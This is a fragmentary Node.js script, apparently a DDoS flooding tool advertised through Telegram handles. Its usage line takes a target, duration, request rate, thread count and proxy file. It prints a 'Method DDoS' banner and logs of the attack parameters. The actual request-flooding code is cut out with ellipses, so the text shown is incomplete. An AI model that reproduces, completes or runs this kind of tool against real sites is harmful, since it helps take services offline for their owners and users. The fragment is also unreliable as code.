...
@stevenstoree
 Usage: node steven.js <target> <duration> <request per second> <threads> <proxyfile>`); process.exit();}
 const headers = {};
...
console.log(`
             ...
             ╚╦════════════════════════════════════════╦╝
           ╔══╩════════════════════════════════════════╩═══╗
             Method DDoS By t.me/stevenstoree | t.me/Lintar21
           ╚══╦═════════════════════════════════════════╦══╝
              ╚═════════════════════════════════════════╝
`)
console.log(`[@steven] Target: `+ process.argv[2])
console.log(`[@steven] Time: `+ process.argv[3])
console.log(`[@steven] Rate: `+ process.argv[4])
console.log(`[@steven] Thread: ` + process.argv[5])
console.log(`[@steven] Request: GET`)
console.log(`[@steven] Methods: STEVEN`)
console.log(`[@steven] Methods DDoS By STEVEN•STORE🕊🪽`)
